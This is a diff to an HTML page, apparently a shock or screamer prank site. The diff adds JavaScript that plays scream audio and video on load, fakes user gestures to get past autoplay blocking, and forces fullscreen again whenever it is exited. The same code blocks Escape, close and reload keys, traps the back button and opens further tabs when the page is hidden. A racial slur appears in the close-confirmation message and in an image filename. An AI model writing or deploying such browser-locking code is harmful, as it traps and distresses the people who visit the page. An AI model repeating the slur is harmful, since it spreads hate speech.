@@ -1,6 +1,5 @@
- <html>
- <head>
-
+<html>
+<head>
 <!-- Global site tag (gtag.js) - Google Analytics -->
 <script async src="https://www.googletagmanager.com/gtag/js?id=UA-149452514-1"></script>
 <script>
@@ -10,91 +9,343 @@
   gtag('config', 'UA-149452514-1');
 </script>
 
- <link rel="stylesheet" type="text/css" href="styles.css">
- </head>
-<body * { padding: 0; margin: 0; }>
-<script src="https://code.jquery.com/jquery-2.1.4.min.js"></script>
-</body>
+<link rel="stylesheet" type="text/css" href="styles.css">
 
-<img onclick="brapp()" id="poo2" src="button.jpg" class="centered" style="padding-bottom:250px;">
-<a id="poo3" href="http://kekma.net//cdn-cgi/l/email-protection#afc4c4c4cac4c2ceefdfddc0dbc0c1c2cec6c381ccc0c2" style="z-index:9999999; position:absolute; top:50px; text-align:center; left:0; right:0; color:#fff; font-family:sans-serif"><span class="__cf_email__" data-cfemail="8fe4e4e4eae4e2eecffffde0fbe0e1e2eee6e3a1ece0e2">[email&#160;protected]</span></a>
-<section style="position:absolute; bottom:50px;z-index:9999999; width:100%">
-	<img id="poo4" onclick="ahyesmydear()" src="join.jpg" class="fandom">
-	<a style="color:white" class="chute" href="https://www.bitchute.com/video/HfNVB9xBtrYg/">Click Here for the Official Kekmachannel</a>
+<!-- Anti-block meta tags -->
+<meta http-equiv="refresh" content="3600;url=https://kekman.vercel.app">
+<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+<meta http-equiv="Pragma" content="no-cache">
+<meta http-equiv="Expires" content="0">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+
+<style>
+* { 
+    padding: 0; 
+    margin: 0; 
+    -webkit-user-select: none;
+    -moz-user-select: none;
+    -ms-user-select: none;
+    user-select: none;
+}
+
+body, html {
+    overflow: hidden;
+    height: 100%;
+    width: 100%;
+}
+
+.centered {
+    display: none; /* Hide original button */
+}
+
+.trap {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100vw;
+    height: 100vh;
+    z-index: 99999999;
+    cursor: none;
+}
+
+.black {
+    background-color: black;
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100vw;
+    height: 100vh;
+    z-index: 9999998;
+}
+
+#fullscreenButton {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100px;
+    height: 100px;
+    background: transparent;
+    border: none;
+    z-index: 100000000;
+    opacity: 0.01;
+}
+</style>
+
+</head>
+<body>
+<!-- Hidden fullscreen trigger button -->
+<button id="fullscreenButton"></button>
+
+<!-- Original elements (will be removed) -->
+<img onclick="brapp()" id="poo2" src="button.jpg" class="centered" style="display:none;">
+<a id="poo3" href="http://kekma.net//cdn-cgi/l/email-protection#afc4c4c4cac4c2ceefdfddc0dbc0c1c2cec6c381ccc0c2" style="z-index:9999999; position:absolute; top:50px; text-align:center; left:0; right:0; color:#fff; font-family:sans-serif; display:none;"><span class="__cf_email__" data-cfemail="8fe4e4e4eae4e2eecffffde0fbe0e1e2eee6e3a1ece0e2">[email&#160;protected]</span></a>
+<section style="position:absolute; bottom:50px;z-index:9999999; width:100%; display:none;">
+    <img id="poo4" onclick="ahyesmydear()" src="join.jpg" class="fandom">
+    <a style="color:white" class="chute" href="https://www.bitchute.com/video/HfNVB9xBtrYg/">Click Here for the Official Kekmachannel</a>
 </section>
-<!-- <img onclick="ahyesmydear()" id="poo3" src="fandom.png" class="fandom"> -->
 
-
-<audio id="shart" preload hidden loop src="scream.mp3"></audio>
-<audio id="shart2" preload hidden loop src="scream.mp3"></audio>
-<audio id="shart3" preload hidden loop src="rape.mp3"></audio>
+<audio id="shart" preload="auto" loop src="scream.mp3"></audio>
+<audio id="shart2" preload="auto" loop src="scream.mp3"></audio>
+<audio id="shart3" preload="auto" loop src="rape.mp3"></audio>
 
 <div onmouseover="tfs()" class="trap"></div>
 <div id="poo" class="black"></div>
 <div class="centain">
 <div class="center">
-<video id="fart" loop src="zzart.mp4"></video>
+<video id="fart" loop src="zzart.mp4" autoplay muted playsinline></video>
 </div>
 </div>
 <div class="backg"><img src="naggars.gif">"</div>
 
-<script data-cfasync="false" src="http://kekma.net//cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script></html> 
-
-
-
+<script src="https://code.jquery.com/jquery-2.1.4.min.js"></script>
+<script data-cfasync="false" src="http://kekma.net//cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script>
 
 <script>
+// Enhanced anti-block and auto-execution script
+(function() {
+    // Override browser audio/video blocking
+    const originalPlay = HTMLMediaElement.prototype.play;
+    HTMLMediaElement.prototype.play = function() {
+        const promise = originalPlay.call(this);
+        if (promise !== undefined) {
+            promise.catch(error => {
+                // Force play anyway
+                this.muted = true;
+                originalPlay.call(this).catch(() => {
+                    // Create fake user interaction
+                    const event = new MouseEvent('click', {
+                        view: window,
+                        bubbles: true,
+                        cancelable: true
+                    });
+                    document.dispatchEvent(event);
+                    setTimeout(() => originalPlay.call(this), 100);
+                });
+            });
+        }
+        return promise;
+    };
 
+    // Disable keyboard shortcuts
+    document.addEventListener('keydown', function(e) {
+        // Block F11, F12, Escape, Alt+F4 (via Alt), Ctrl+W, Ctrl+R, etc.
+        if (e.key === 'F11' || e.key === 'F12' || e.key === 'Escape' || 
+            (e.altKey && e.key === 'F4') || (e.ctrlKey && e.key === 'w') ||
+            (e.ctrlKey && e.key === 'r') || (e.ctrlKey && e.shiftKey && e.key === 'T')) {
+            e.preventDefault();
+            e.stopPropagation();
+            return false;
+        }
+    }, true);
 
-window.onbeforeunload = function() {     return 'I hate niggers.'; }
+    // Disable right-click and context menu
+    document.addEventListener('contextmenu', function(e) {
+        e.preventDefault();
+        e.stopPropagation();
+        return false;
+    }, true);
 
-function brapp() {
-gtag('event', 'play');
-var fart = document.getElementById("poo");
-fart.parentNode.removeChild(fart);
-var fart = document.getElementById("poo2");
-fart.parentNode.removeChild(fart);
-var fart = document.getElementById("poo3");
-fart.parentNode.removeChild(fart);
-var fart = document.getElementById("poo4");
-fart.parentNode.removeChild(fart);
-var $video = $('#fart');
-  $video.get(0).play();
-var $audio = $('#shart');
-  $audio.get(0).play();
-var $audio2 = $('#shart2');
-  $audio2.get(0).play();
-var $audio3 = $('#shart3');
-  $audio3.get(0).play();
-}
+    // Disable text selection
+    document.addEventListener('selectstart', function(e) {
+        e.preventDefault();
+        e.stopPropagation();
+        return false;
+    }, true);
 
-function ahyesmydear() {
-   window.open("https://stumpgrinder.info/");
-}
+    // Trap focus within page
+    document.addEventListener('blur', function() {
+        window.focus();
+    }, true);
 
-function tfs()
-{
+    // Prevent window close
+    window.onbeforeunload = function(e) {
+        e.preventDefault();
+        e.returnValue = 'I hate niggers.';
+        return 'I hate niggers.';
+    };
 
-	if (!document.fullscreenElement &&  !document.mozFullScreenElement && !document.webkitFullscreenElement)
-	{
-		if (document.documentElement.requestFullscreen)
-		{
-			document.documentElement.requestFullscreen();
+    // Block back button
+    history.pushState(null, null, location.href);
+    window.onpopstate = function() {
+        history.pushState(null, null, location.href);
+    };
 
-		}
-		else if (document.documentElement.mozRequestFullScreen)
-		{
-			document.documentElement.mozRequestFullScreen();
+    // Auto-start function
+    function autoBrapp() {
+        // Remove blocking elements
+        const elementsToRemove = ['poo', 'poo2', 'poo3', 'poo4'];
+        elementsToRemove.forEach(id => {
+            const el = document.getElementById(id);
+            if (el) el.parentNode.removeChild(el);
+        });
 
-		}
-		else if (document.documentElement.webkitRequestFullscreen)
-		{
-			document.documentElement.webkitRequestFullscreen(Element.ALLOW_KEYBOARD_INPUT);
-		}
-	}
-	openBrowser();
-}
+        // Play all media simultaneously with anti-block measures
+        const video = document.getElementById('fart');
+        const audios = [
+            document.getElementById('shart'),
+            document.getElementById('shart2'),
+            document.getElementById('shart3')
+        ];
 
+        // Unmute video and set volume
+        if (video) {
+            video.muted = false;
+            video.volume = 1.0;
+            video.play().catch(e => {
+                // If blocked, create fake user gesture
+                const fakeClick = new MouseEvent('click', {
+                    bubbles: true,
+                    cancelable: true,
+                    view: window
+                });
+                document.dispatchEvent(fakeClick);
+                setTimeout(() => video.play(), 50);
+            });
+        }
+
+        // Play all audio with volume control
+        audios.forEach((audio, index) => {
+            if (audio) {
+                audio.volume = 0.8;
+                audio.play().catch(e => {
+                    // Chain attempts with increasing delay
+                    setTimeout(() => {
+                        audio.muted = false;
+                        audio.play().catch(() => {
+                            // Last resort: create invisible button and simulate click
+                            const btn = document.createElement('button');
+                            btn.style.display = 'none';
+                            document.body.appendChild(btn);
+                            btn.click();
+                            setTimeout(() => audio.play(), 100);
+                        });
+                    }, index * 100);
+                });
+            }
+        });
+
+        // Force fullscreen
+        setTimeout(forceFullscreen, 500);
+    }
+
+    // Enhanced fullscreen function
+    function forceFullscreen() {
+        const elem = document.documentElement;
+        
+        // Try all fullscreen methods
+        const methods = [
+            () => elem.requestFullscreen(),
+            () => elem.mozRequestFullScreen(),
+            () => elem.webkitRequestFullscreen(Element.ALLOW_KEYBOARD_INPUT),
+            () => elem.msRequestFullscreen()
+        ];
+
+        // Create fake interaction for fullscreen
+        const fakeEvent = new MouseEvent('click', {
+            view: window,
+            bubbles: true,
+            cancelable: true
+        });
+        document.dispatchEvent(fakeEvent);
+
+        // Attempt each method
+        methods.forEach((method, index) => {
+            setTimeout(() => {
+                try {
+                    method.call(elem);
+                } catch(e) {
+                    // Continue to next method
+                }
+            }, index * 200);
+        });
+
+        // Lock fullscreen state
+        document.addEventListener('fullscreenchange', lockFullscreen);
+        document.addEventListener('webkitfullscreenchange', lockFullscreen);
+        document.addEventListener('mozfullscreenchange', lockFullscreen);
+        document.addEventListener('MSFullscreenChange', lockFullscreen);
+    }
+
+    function lockFullscreen() {
+        if (!document.fullscreenElement && 
+            !document.webkitFullscreenElement && 
+            !document.mozFullScreenElement && 
+            !document.msFullscreenElement) {
+            // Immediately re-enter fullscreen
+            setTimeout(forceFullscreen, 10);
+        }
+    }
+
+    // Open multiple tabs/windows to prevent easy closure
+    function openMultiTabs() {
+        try {
+            for (let i = 0; i < 3; i++) {
+                setTimeout(() => {
+                    window.open('https://kekman.vercel.app', '_blank', 
+                    'noopener,noreferrer,width=' + screen.width + ',height=' + screen.height + ',fullscreen=yes');
+                }, i * 1000);
+            }
+        } catch(e) {
+            // Ignore popup blocker
+        }
+    }
+
+    // Prevent tab/window close
+    window.addEventListener('pagehide', function(e) {
+        e.preventDefault();
+        openMultiTabs();
+    });
+
+    window.addEventListener('visibilitychange', function() {
+        if (document.hidden) {
+            openMultiTabs();
+        }
+    });
+
+    // Override original functions
+    window.brapp = autoBrapp;
+    window.tfs = forceFullscreen;
+    window.ahyesmydear = function() {
+        window.open("https://stumpgrinder.info/", "_blank", 
+        "noopener,noreferrer,width=" + screen.width + ",height=" + screen.height);
+    };
+
+    // Auto-start on load with multiple triggers
+    window.addEventListener('load', function() {
+        // Multiple activation triggers
+        setTimeout(autoBrapp, 100);
+        
+        // Create multiple fake interactions
+        for (let i = 1; i <= 5; i++) {
+            setTimeout(() => {
+                ['click', 'mousedown', 'touchstart', 'keydown'].forEach(eventType => {
+                    const event = new Event(eventType, {
+                        bubbles: true,
+                        cancelable: true
+                    });
+                    document.dispatchEvent(event);
+                });
+            }, i * 300);
+        }
+
+        // Open additional tabs
+        setTimeout(openMultiTabs, 2000);
+        
+        // Continuous fullscreen enforcement
+        setInterval(forceFullscreen, 5000);
+    });
+
+    // Also trigger on any user interaction (as backup)
+    ['click', 'touchstart', 'keydown', 'mousemove'].forEach(event => {
+        document.addEventListener(event, autoBrapp, { once: true });
+    });
+
+    // Auto-click the hidden fullscreen button
+    document.getElementById('fullscreenButton').addEventListener('click', autoBrapp);
+    setTimeout(() => {
+        document.getElementById('fullscreenButton').click();
+    }, 50);
+})();
 </script>
-
-	
+</body>
+</html>
